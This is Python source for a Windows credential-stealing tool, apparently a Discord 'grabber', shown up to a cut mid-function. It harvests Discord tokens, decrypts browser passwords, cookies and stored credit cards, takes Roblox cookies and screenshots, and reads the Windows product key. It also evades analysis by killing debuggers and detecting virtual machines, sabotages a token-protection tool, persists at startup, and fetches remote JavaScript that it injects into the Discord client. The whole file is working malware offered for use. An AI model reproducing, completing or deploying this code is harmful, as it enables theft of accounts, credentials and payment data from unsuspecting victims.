import os
import re
import hmac
import json
import httpx
import winreg
import ctypes
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess

from sys import argv
from pyotp import TOTP
from pathlib import Path
from PIL import ImageGrab
from struct import unpack
from base64 import b64decode
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import DES3, AES
from pyasn1.codec.der import decoder
from Crypto.Util.Padding import unpad
from hashlib import sha1, pbkdf2_hmac
from binascii import hexlify, unhexlify
from win32crypt import CryptUnprotectData
from Crypto.Util.number import long_to_bytes

config = {
    'webhook': "WEBHOOK_HERE",
    'webhook_protector_key': "KEY_HERE",
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': False,
    # if you want the file to run at startup
    'startup': False,
    # if you want the file to hide itself after run
    'hide_self': False,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]

}
Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")


class options(object):
    directory = ''
    password = ''
    masterPassword = ''


class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        except:
            return False
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def fetchConf(e: str) -> str or bool:
        return config.get(e)

    @staticmethod
    def findProfiles(name, path):
        folders = []
        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge", "CentBrowser", "Orbitum", "Epic Privacy Browser"]:
            folders = [element for element in os.listdir(
                path) if re.search("^Profile*|^Default$", element) != None]
        elif os.path.exists(path + '\\_side_profiles'):
            folders = [element for element in os.listdir(
                path + '\\_side_profiles')]
            folders.append('def')
        return folders

    @staticmethod
    def getShortLE(d, a):
        return unpack('<H', (d)[a:a+2])[0]

    @staticmethod
    def getLongBE(d, a):
        return unpack('>L', (d)[a:a+4])[0]

    @staticmethod
    def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData, options):
        hp = sha1(globalSalt+masterPassword).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1(hp+entrySalt).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    @staticmethod
    def decodeLoginData(data):
        asn1data = decoder.decode(
            b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext


class Cookies_Grabber(functions):
    def __init__(self):
        self.webhook = self.fetchConf('webhook')
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + \
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []
        self.browsers = []
        self.paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\',
            'Torch': self.appdata + '\\Torch\\User Data\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\'
        }
        self.CKA_ID = unhexlify('f8000000000000000000000000000001')
        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        if self.fetchConf('anti_debug'):
            if AntiDebug().inVM:
                os._exit(0)
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens,
                        self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo]
        if self.fetchConf('hide_self'):
            function_list.append(self.hide)

        if self.fetchConf('kill_processes'):
            await self.killProcesses()

        if self.fetchConf('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            function_list.append(self.firefoxCookies)
            function_list.append(self.firefoxPasswords)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        await self.injector()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup_loc)
        except Exception:
            pass

    async def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata+self.sep+_dir
                disc_sep = discord+self.sep
                for __dir in os.listdir(os.path.abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = os.path.abspath(disc_sep+__dir)
                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                        if os.path.exists(inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'initiation', exist_ok=True)
                                except PermissionError:
                                    pass
                            if "api/webhooks" in self.webhook:
                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                    "%WEBHOOK%", self.webhook)
                            else:
                                f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                    "%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
                            try:
                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                    indexFile.write(f)
                            except PermissionError:
                                pass
                            if self.fetchConf('kill_processes'):
                                os.startfile(app + self.sep + _dir + '.exe')

    async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'RdimoTheGoat, damn right')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        for name, path in self.paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in path:
                disc = name.replace(" ", "").lower()
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                profiles = self.findProfiles(name, path)
                if profiles == []:
                    path = path + 'Local Storage\\leveldb\\'
                    profiles = ["None"]
                for profile in profiles:
                    if profile == 'def':
                        path = self.paths[name] + 'Local Storage\\leveldb\\'
                    elif os.path.exists(self.paths[name] + "_side_profiles\\" + profile + '\\Local Storage\\leveldb\\'):
                        path = self.paths[name] + "_side_profiles\\" + \
                            profile + '\\Local Storage\\leveldb\\'
                    elif profile == None:
                        pass
                    else:
                        path = self.paths[name] + \
                            f'{profile}\\Local Storage\\leveldb\\'
                    if not os.path.exists(path):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Login Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Login Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Login Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Login Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Login Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault1.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins")
                except:
                    continue
                with open(self.dir+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_val(
                            encrypted_password, master_key)
                        if url != "":
                            f.write(
                                f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def grabCookies(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Network\\cookies'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Network\\cookies'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Network\\cookies'):
                    login_db = path + "_side_profiles\\" + profile + '\\Network\\cookies'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == "None":
                    pass
                else:
                    login_db = path + f'{profile}\\Network\\cookies'
                if not os.path.exists(login_db):
                    login_db = login_db[:-15] + self.sep + 'cookies'
                    if not os.path.exists(login_db):
                        continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault2.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT host_key, name, encrypted_value from cookies")
                except:
                    continue
                with open(self.dir+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_val(r[2], master_key)
                        if host != "":
                            f.write(
                                f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                        if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                            self.robloxcookies.append(decrypted_cookie)
                    cursor.close()
                    conn.close()
                    os.remove(login)

    @try_extract
    def firefoxCookies(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            cookies = path + os.sep + profile + os.sep + "cookies.sqlite"
            if not os.path.exists(cookies):
                continue
            conn = sqlite3.connect(cookies)
            try:
                cursor = conn.execute(
                    "SELECT host, name, value FROM moz_cookies")
            except:
                continue
            with open(self.dir + os.sep + f'FirefoxCookies.txt', mode='a', newline='', encoding='utf-8') as f:
                f.write(f"\nProfile: {profile}\n\n")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    cookie = r[2]
                    if host != "":
                        f.write(
                            f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n")
                cursor.close()
                conn.close()

    def printASN1(self, d, l, rl):
        type = d[0]
        length = d[1]
        if length & 0x80 > 0:
            nByteLength = length & 0x7f
            length = d[2]
            skip = 1
        else:
            skip = 0
        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length+2
        elif type == 6:
            oidVal = hexlify(d[2:2+length])
            return length+2
        elif type == 4:
            return length+2
        elif type == 5:
            return length+2
        elif type == 2:
            return length+2
        else:
            if length == l-2:
                return length

    def readBsddb(self, name, options):
        f = open(name, 'rb')
        header = f.read(4*15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            return
        version = self.getLongBE(header, 4)
        if version != 2:
            return
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets = f.read((nkeys+1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2+i)
                val = self.getShortLE(offsets, 4+i)
                nval = self.getShortLE(offsets, 8+i)
                offsetVals.append(key + pagesize*page)
                offsetVals.append(val + pagesize*page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize*(page+1))
            valKey = sorted(offsetVals)
            for i in range(keys*2):
                f.seek(valKey[i])
                data = f.read(valKey[i+1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i+1]] = db1[i]
        return db

    def getLoginData(self, options):
        logins = []
        sqlite_file = options.directory / 'signons.sqlite'
        json_file = options.directory / 'logins.json'
        if json_file.exists():  # since Firefox 32, json is used instead of sqlite3
            loginf = open(json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append((self.decodeLoginData(encUsername),
                            self.decodeLoginData(encPassword), row['hostname']))
            return logins
        elif sqlite_file.exists():  # firefox < 32
            conn = sqlite3.connect(sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                logins.append((self.decodeLoginData(encUsername),
                            self.decodeLoginData(encPassword), row[1]))
            return logins

    def extractSecretKey(self, masterPassword, keyData, options):
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, encryptedPasswd, options)
        if cleartextData != b'password-check\x02\x02':
            return

        if self.CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[self.CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data = privKeyEntry[3+saltLen+nameLen:]
        self.printASN1(data, len(data), 0)
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decryptMoz3DES(
            globalSalt, masterPassword, entrySalt, privKeyData, options)
        self.printASN1(privKey, len(privKey), 0)
        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        self.printASN1(prKey, len(prKey), 0)
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])
        return key

    def decryptPBE(self, decodedItem, masterPassword, globalSalt, options):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = self.decryptMoz3DES(
                globalSalt, masterPassword, entrySalt, cipherT, options)
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3]
                    [0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32

            k = sha1(globalSalt+masterPassword).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt,
                            iterationCount, dklen=keyLength)

            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

            return clearText, pbeAlgo

    def getKey(self, masterPassword, directory, options):
        if (directory / 'key4.db').exists():
            # firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
            conn = sqlite3.connect(directory / 'key4.db')
            c = conn.cursor()
            # first check password
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]  # item1
            item2 = row[1]
            self.printASN1(item2, len(item2), 0)
            decodedItem2 = decoder.decode(item2)
            clearText, algo = self.decryptPBE(
                decodedItem2, masterPassword, globalSalt, options)

            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 == self.CKA_ID:
                    self.printASN1(a11, len(a11), 0)
                    decoded_a11 = decoder.decode(a11)
                    clearText, algo = self.decryptPBE(
                        decoded_a11, masterPassword, globalSalt, options)
                    return clearText[:24], algo
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = self.readBsddb(directory / 'key3.db', options)
            key = self.extractSecretKey(masterPassword, keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        return None, None

    @try_extract
    def firefoxPasswords(self):
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        profiles = os.listdir(path)
        for profile in profiles:
            direct = Path(path + self.sep + profile + self.sep)
            options.directory = direct
            key, algo = self.getKey(options.masterPassword.encode(),
                                    options.directory, options)
            if key == None:
                continue
            logins = self.getLoginData(options)
            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                with open(self.dir + os.sep + f'Firefox passwords.txt', mode='a', newline='', encoding='utf-8') as f:
                    f.write(f"\nProfile: {profile}\n\n")
                    for i in logins:
                        assert i[0][0] == self.CKA_ID
                        url = '%20s:' % (i[2])  # site URL
                        iv = i[0][1]
                        ciphertext = i[0][2]
                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        iv = i[1][1]
                        ciphertext = i[1][2]
                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        f.write(
                            f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")

    @try_extract
    def creditInfo(self):
        for name, path in self.paths.items():
            localState = path + '\\Local State'
            if not os.path.exists(localState):
                continue
            profiles = self.findProfiles(name, path)
            if profiles == []:
                login_db = path + '\\Web Data'
                profiles = ["None"]
            for profile in profiles:
                localState = path + '\\Local State'
                if profile == 'def':
                    login_db = path + '\\Web Data'
                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Web Data'):
                    login_db = path + "_side_profiles\\" + profile + '\\Web Data'
                    localState = path + "_side_profiles\\" + profile + '\\Local State'
                    if not os.path.exists(localState):
                        continue
                elif profile == None:
                    pass
                else:
                    login_db = path + f'{profile}\\Web Data'
                if not os.path.exists(login_db):
                    continue
                master_key = self.get_master_key(localState)
                if master_key == False:
                    continue
                login = self.dir + self.sep + "Loginvault3.db"
                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                try:
                    cursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                except:
                    continue
                with open(self.dir+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
                    for r in cursor.fetchall():
                        namee = r[0]
                        exp1 = r[1]
                        exp2 = r[2]
                        decrypted_password = self.decrypt_val(r[3], master_key)
                        if namee != "":
                            f.write(
                                f"Name: {namee}\nExp: {exp1}/{exp2}\nCC: {decrypted_password}\n\n")
                    cursor.close()
                    conn.close()
                    os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "Grabber By github.com/Callumgm\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x+"\n\nGrabber By github.com/Callumgm")
        w = self.getProductValues()
        wname = w[0].replace(" ", "")
        wkey = w[1].replace(" ", "")
        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        ip = "N/A"
        city = "N/A"
        country = "N/A"
        region = "N/A"
        org = "N/A"
        loc = "N/A"
        googlemap = "N/A"
        for site in ["https://utilities.tk/network/info", "https://ipinfo.io/json"]:
            try:
                data = httpx.get(site).json()
                try:
                    ip = data.get('ip')
                    city = data.get('city')
                    country = data.get('country')
                    region = data.get('region')
                    org = data.get('org')
                    loc = data.get('loc')
                    googlemap = "https://www.google.com/maps/search/google+map++" + loc
                    break
                except Exception:
                    pass
            except Exception:
                pass

        _zipfile = os.path.join(
            self.appdata, f'Cookies.Grabber-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "
        embed = {
